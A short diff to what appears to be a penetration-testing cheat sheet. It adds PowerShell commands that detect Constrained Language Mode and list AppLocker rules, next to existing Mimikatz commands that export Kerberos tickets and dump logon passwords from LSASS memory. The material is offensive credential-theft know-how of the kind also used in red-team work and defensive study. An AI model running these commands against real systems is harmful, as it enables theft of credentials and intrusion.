@@ -846,6 +846,12 @@ $ sekurlsa::tickets /export
 $ sekurlsa::minidump C:\Windows\Tasks\lsass.dmp
 $ sekrulsa::logonpasswords
 
+[Constrained Language Mode (CLM)]
+#### Check if you are in Constrained Mode
+$Executioncontext.Sessionstate.Languagemode
+#### List all AppLocker Rules
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
 [dump lsass with signed binary]
 #### Get lsass.exe PID
 Get-Process lsass | select id
